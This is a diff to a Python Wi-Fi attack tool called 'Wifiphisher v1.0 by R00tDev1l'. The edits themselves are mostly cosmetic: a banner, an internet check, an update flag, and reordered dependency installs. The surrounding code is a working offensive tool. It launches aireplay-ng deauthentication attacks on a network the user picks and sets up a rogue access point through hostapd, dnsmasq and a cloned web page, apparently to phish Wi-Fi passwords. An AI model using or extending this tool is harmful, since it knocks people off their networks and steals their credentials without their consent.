@@ -14,7 +14,38 @@ iface2 = None
 networks = []
 version = "1.0"  
 
+def banner():
+    print(Fore.GREEN + Style.BRIGHT + r"""
+⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣿⠷⠾⠛⠛⠛⠛⠷⠶⢶⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⣀⣴⡾⠛⠉⠁⠀⣰⡶⠶⠶⠶⠶⠶⣶⡄⠀⠉⠛⠿⣷⣄⡀⠀⠀⠀
+⠀⠀⣠⣾⠟⠁⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⣼⠃⠀⠀⠀⠀⠈⠛⢿⣦⡀⠀
+⢠⣼⠟⠁⠀⠀⠀⠀⣠⣴⣶⣿⡇⠀⠀⠀⠀⠀⣿⣷⣦⣄⠀⠀⠀⠀⠀⠙⣧⡀
+⣿⡇⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣇⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⢈⣷
+⣿⣿⣦⡀⣠⣾⣿⣿⣿⡿⠟⢻⣿⠀⠀⠀⠀⢠⣿⠻⢿⣿⣿⣿⣿⣆⣀⣠⣾⣿
+⠉⠻⣿⣿⣿⣿⣽⡿⠋⠀⠀⠸⣿⠀⠀⠀⠀⢸⡿⠀⠀⠉⠻⣿⣿⣿⣿⣿⠟⠁
+⠀⠀⠈⠙⠛⣿⣿⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⢸⣇⠀⠀⠀⠀⣹⣿⡟⠋⠁⠀⠀
+⠀⠀⠀⠀⠀⢿⣿⣷⣄⣀⣴⣿⣿⣤⣤⣤⣤⣼⣿⣷⣀⣀⣾⣿⣿⠇⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⣿⣿⣿⠟⠛⠛⠻⣿⣿⣿⣿⣿⡿⠛⠉⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⣿⡇⠀⠀⠀⠀⢸⣿⡏⠙⠋⠁⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷⣄⠀⠀⣀⣾⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣏⠀""" + Fore.YELLOW + f"""[ Wifiphisher v{version} by R00tDev1l]
+""")
 
+    
+def check_internet():
+    try:
+        response = requests.get("https://www.google.com", timeout=5)
+        if response.status_code == 200:
+            print(Fore.GREEN + "\n🟢 Internet is connected.")
+            return
+    except requests.ConnectionError:
+        print(Fore.RED + "\n🔴 No internet connection.")
+    except requests.Timeout:
+        print(Fore.YELLOW + "🟡 Connection timed out.")
+
+    
+    exit()
+    
 def revert_to_user():
     if os.geteuid() == 0:
         original_user = os.environ.get("SUDO_USER")
@@ -37,6 +68,7 @@ def revert_to_user():
         print(f"\n{Fore.GREEN}🟢 Running as non-root user: {os.environ.get('USER')}")
         
 def updater():
+    check_internet()
     version_url = "https://raw.githubusercontent.com/Darkhaxxor005/Wifiphisher/refs/heads/main/version.txt"
     current_dir = os.getcwd()
     clone_folder = "Wifiphisher"
@@ -94,6 +126,30 @@ def updater():
         print(f"\n{Fore.RED}🔴 Git clone failed: {e}")
     except Exception as e:
         print(f"\n{Fore.RED}🔴 Error during update: {e}")
+        
+def check():
+    if os.geteuid() != 0:
+       print(Fore.RED + "\n[!] Run this script as root.\n")
+       sys.exit(1)   
+       
+    def is_installed_binary(cmd):
+        return shutil.which(cmd) is not None
+
+    def install(pkg):
+        print(f"\n{Fore.YELLOW}⏳ Installing {pkg}...")
+        subprocess.run(['sudo', 'apt', 'install', '-y', pkg])
+
+    # Check and install hostapd
+    if is_installed_binary('hostapd'):
+        print(f"\n{Fore.GREEN}🟢 hostapd is already installed.")
+    else:
+        install('hostapd')
+
+    # Check and install gnome-terminal
+    if is_installed_binary('gnome-terminal'):
+        print(f"\n{Fore.GREEN}🟢 gnome-terminal is already installed.")
+    else:
+        install('gnome-terminal')
 
 def get_wireless_interfaces():
     result = subprocess.run(["iwconfig"], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
@@ -110,7 +166,7 @@ def select_interface():
         print(Fore.RED + "\n🔴 No wireless interfaces found.")
         exit(1)
     
-    print(Fore.CYAN + "\n📶 Available Wireless Interfaces\n")
+    print(Fore.CYAN + "\n📶 Available Wireless Interfaces 🔽\n")
     for i, iface in enumerate(interfaces, 1):
         print(f"{i}. {iface}")
     
@@ -121,13 +177,13 @@ def signal_strength_color(power):
     try:
         power = int(power)
         if power >= -60:
-            return Fore.GREEN + "\n🟢 Strong"
+            return Fore.GREEN + "🟢 Strong\n"
         elif -75 <= power < -60:
-            return Fore.YELLOW + "\n🟡 Medium"
+            return Fore.YELLOW + "🟡 Medium\n"
         else:
-            return Fore.RED + "\n🔴 Weak"
+            return Fore.RED + "🔴 Weak\n"
     except:
-        return Fore.WHITE + "\n📴 Unknown"
+        return Fore.WHITE + "📴 Unknown\n"
 
 def scan_networks(mon_interface):
     print(Fore.GREEN + "\n🔍 Scanning for networks...")
@@ -139,7 +195,7 @@ def scan_networks(mon_interface):
         mon_interface
     ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-    time.sleep(15)
+    time.sleep(5)
     proc.send_signal(signal.SIGINT)
     time.sleep(2)
 
@@ -157,7 +213,7 @@ def scan_networks(mon_interface):
         i += 1
     i += 1  # Skip header
 
-    print(Fore.CYAN + "\n📡 Available Wi-Fi Networks:")
+    print(Fore.CYAN + "\n📡 Available Wi-Fi Networks \n")
     index = 1
     while i < len(lines) and lines[i].strip():
         cols = lines[i].split(",")
@@ -181,7 +237,7 @@ def deauth(bssid, channel, mon_interface, count=0):
         print(Fore.CYAN + f"\n🔧 Setting channel {channel}...")
         subprocess.run(["sudo", "iwconfig", mon_interface, "channel", channel], check=True)
 
-        print(Fore.GREEN + f"\n🔧 Launching deauth attack on {bssid} (channel {channel}) 🚨")
+        print(Fore.GREEN + f"\n🔧 Launching deauth attack on {bssid} (channel {channel}) 🚨\n")
         subprocess.run([
             "sudo", "aireplay-ng",
             "--deauth", str(count),
@@ -192,6 +248,7 @@ def deauth(bssid, channel, mon_interface, count=0):
         print(Fore.RED + "\n🔴 Attack stopped by user.")
 
 def enable():
+    banner()
     print(Fore.CYAN + "\n🎯 Enter interface for deauth attack 🔽")
     iface = select_interface()
 
@@ -204,7 +261,7 @@ def enable():
 
     if not found:
         print(Fore.RED + "\n🔴 No networks found.")
-        return
+        exit()
 
     try:
         choice = int(input(Fore.YELLOW + f"\n💡 Select network number to attack: {Style.RESET_ALL}"))
@@ -214,8 +271,11 @@ def enable():
     except (IndexError, ValueError):
         print(Fore.RED + "\n🔴 Invalid selection.")
     finally:
-        print(Fore.CYAN + "\n🔧 Stopping monitor mode...")
+        print(Fore.RED + "\n\n🔴 Ctrl + C triggered. Cleaning up and exiting...")
         subprocess.run(["sudo", "airmon-ng", "stop", mon_interface])
+        clear_csv_files()
+        time.sleep(1)
+        exit()
 
 def clear_csv_files():
     script_dir = os.path.dirname(os.path.abspath(__file__))  # Directory of the script
@@ -240,35 +300,10 @@ try:
    if '--run-deauth' in sys.argv:
        enable()
 except KeyboardInterrupt:
-        print(Fore.RED + "\n\n🔴 Ctrl + C triggered. Cleaning up and exiting...")
+        print(Fore.RED + "\n🔴 Ctrl + C triggered. Cleaning up and exiting...")
         clear_csv_files()
         time.sleep(1)
         exit()
-
-def check():
-    updater()
-    if os.geteuid() != 0:
-       print(Fore.RED + "\n[!] Run this script as root.\n")
-       sys.exit(1)   
-       
-    def is_installed_binary(cmd):
-        return shutil.which(cmd) is not None
-
-    def install(pkg):
-        print(f"\n{Fore.YELLOW}⏳ Installing {pkg}...")
-        subprocess.run(['sudo', 'apt', 'install', '-y', pkg])
-
-    # Check and install hostapd
-    if is_installed_binary('hostapd'):
-        print(f"\n{Fore.GREEN}🟢 hostapd is already installed.")
-    else:
-        install('hostapd')
-
-    # Check and install gnome-terminal
-    if is_installed_binary('gnome-terminal'):
-        print(f"\n{Fore.GREEN}🟢 gnome-terminal is already installed.")
-    else:
-        install('gnome-terminal')
         
 def setup():
     global iface2
@@ -479,11 +514,11 @@ def cleanup():
     run_command(f"sudo ifconfig {iface2} up")
 
     # Step 7: Remove hostapd.conf
-    print(f"\n{Fore.YELLOW}🔧 Removing hostapd.conf...")
+    print(f"\n{Fore.YELLOW}📁 Removing hostapd.conf...")
     run_command("sudo rm hostapd.conf")
 
     # Step 8: Remove dnsmasq.conf
-    print(f"\n{Fore.YELLOW}🔧 Removing dnsmasq.conf...")
+    print(f"\n{Fore.YELLOW}📁 Removing dnsmasq.conf...")
     run_command("sudo rm dnsmasq.conf")
 
     # Step 9: Remove .htaccess file from /var/www/html
@@ -750,8 +785,12 @@ def listener():
 
 def main():
     try:
+        banner()
+        if '--update' in sys.argv:
+            banner()
+            updater()
+            exit()
         check()
-        # Check for --deauth argument and run subprocess if present
         if '--deauth' in sys.argv:
             subprocess.Popen(['gnome-terminal', '--', 'python3', sys.argv[0], '--run-deauth'])
         setup()
@@ -759,9 +798,12 @@ def main():
         os.system('clear')
         script_dir = os.path.dirname(os.path.realpath(__file__))
         os.chdir(script_dir)
+        banner()
         webclone()
-        os.system('clear')
         engine()
+        time.sleep(2)
+        os.system('clear')
+        banner()
         listener()
 
     except KeyboardInterrupt:
